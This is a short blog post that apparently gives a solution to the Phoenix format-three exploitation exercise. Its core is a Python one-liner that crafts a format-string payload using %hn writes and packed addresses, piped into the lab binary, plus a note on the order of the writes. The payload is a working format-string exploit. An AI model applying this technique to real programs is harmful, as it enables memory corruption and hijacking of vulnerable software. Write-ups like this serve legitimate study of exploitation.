---
layout: post
title: Phoenix Format Three
permalink: /phoenix/
---

python -c 'import sys; sys.stdout.write("%x"*17 + "%25560x" + "A"*3 + "%hn" + "%5120x" + "%hn" + "\x92\x0a\x60\x00\x00\x00\x00\x00" + "A"*8 +"\x90\x0a\x60\x00\x00\x00\x00\x00")' | /opt/phoenix/amd64/format-three

Written all by myself

it first writes to the high two bytes then to the lowest two bytes because the hex in the high two bytes are smaller than the lowest two bytes. 
